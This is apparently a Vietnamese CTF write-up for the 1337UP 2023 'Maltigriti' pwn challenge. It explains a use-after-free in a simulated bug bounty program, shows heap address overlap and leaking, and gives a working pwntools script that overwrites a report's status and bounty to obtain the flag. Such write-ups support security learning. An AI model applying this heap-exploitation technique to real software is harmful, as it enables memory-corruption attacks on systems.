# [1337UP-2023] Maltigriti

<p>Chương trình mô phỏng hệ thống bug bounty, cho phép đăng ký user, tạo report, gửi report,... Mọi report đều mặc định bị đánh dấu là duplicate (status = 'D'). Ta cần tìm cách chuyển trạng thái của report thành Accepted (status = 'A') và có tổng bounty >= 1337 để lấy flag. Nhìn vào pattern code ta có thể đoán được đây là dạng bài về heap -> Tập trung vào những đoạn thao tác malloc/free/read/write.</p>

<p>Trong hàm logout, <code>free(user->bio)</code> (dòng 94) nhưng không set con trỏ về NULL -> Use After Free.</p>

![alt text](/thanhlai/post/buffer_overflow/image/post12/image.png)

<p>Hàm edit_user cho phép nhập kích thước của bio để malloc. Sau đó, dùng fgets để nhập dữ liệu vào vùng vừa malloc -> Vậy nếu như ta <code>free(user->bio)</code> (với kích thước của report khi malloc) rồi malloc ra report mới thì vùng nhớ của report mới sẽ trùng với vùng nhớ của bio trên heap. Cuối cùng, gọi hàm edit_user để ghi đè lên <code>report->status</code> và <code>report->bounty</code> rồi gọi hàm buy_swag_pack (case 5) để in flag. Còn một việc nữa là tính giá trị của <code>report->user</code> sao cho trùng với địa chỉ user trên heap sau khi đăng ký. Vì giá trị <code>report->user</code> đã trỏ tới user từ lúc tạo ra report mới nên sau khi tạo ra một report mới (kích thước bằng bio) thì giá trị tại địa chỉ mà <code>user->bio</code> trỏ tới sẽ bằng địa chỉ user - tức là ta có thể leak qua <code>user->bio</code> (dòng 72).</p> 

![alt text](/thanhlai/post/buffer_overflow/image/post12/image-1.png)

<p>Ta chọn option 0 và 3 để đăng ký user và tạo một report. Quan sát, tham số đầu tiên (giá trị của RDI) của hàm malloc là 0xc0 (192) byte.</p>

![alt text](/thanhlai/post/buffer_overflow/image/post12/image-2.png)

<p>Tiếp theo, đăng ký user mới với kích thước bio là 192. Lúc này, <code>user</code> đang trỏ tới địa chỉ 0x5555555592a0 và <code>user->bio</code> đang trỏ tới địa chỉ 0x555555559300. Vậy nếu đúng như suy luận thì nếu như logout và tạo report mới thì địa chỉ mà <code>report</code> trỏ tới sẽ là 0x555555559300.</p>

![alt text](/thanhlai/post/buffer_overflow/image/post12/image-3.png)

<p>Lúc này, <code>user->bio</code> và <code>report</code> đều trỏ tới 0x555555559300 -> Vậy là ta có thể kiểm soát dữ liệu của report qua hàm edit_user. Mà giá trị tại 0x555555559300 là 0x5555555592a0 -> Khi gọi hàm edit_user, sẽ leak địa chỉ user qua <code>user->bio</code>. Cuối cùng, cần lưu ý mặc dù <code>report->status</code> là 1 byte nhưng vẫn cần padding thêm 7 null byte nữa mới tới <code>report->bounty</code> (có vẻ compiler tự padding thêm để kích thước struct chia hết cho 8).</p>

![alt text](/thanhlai/post/buffer_overflow/image/post12/image-4.png)

<p>Script exploit:<p>

```
from pwn import *

p = process('./maltigriti')

def sla(msg, data): 
    return p.sendlineafter(msg, data)

sla(b'menu> ', b'0')
sla(b'Enter your name> ', b'thanhlai')
sla(b'Enter your password> ', b'thanhlai')
sla(b'How long is your bio>', b'192')
sla(b'Enter your new bio>', b'hehehe')

sla(b'menu> ', b'6')
sla(b'menu> ', b'2')
sla(b'Enter your report title> ', b'hehehe')
sla(b'Please enter the content of your report> ', b'hehehe')

sla(b'menu> ', b'1')
p.recvuntil(b"Your current bio is: ")
leaked_addr = u64(p.recv(6).ljust(8, b'\x00'))
payload = flat(
    p64(leaked_addr),
    p64(ord('A')),
    p64(1337)
)
sla(b'Enter your new bio> ', payload)

sla(b'menu> ', b'5')

p.interactive()
```

<p>Kết quả:</p>

![alt text](/thanhlai/post/buffer_overflow/image/post12/image-5.png)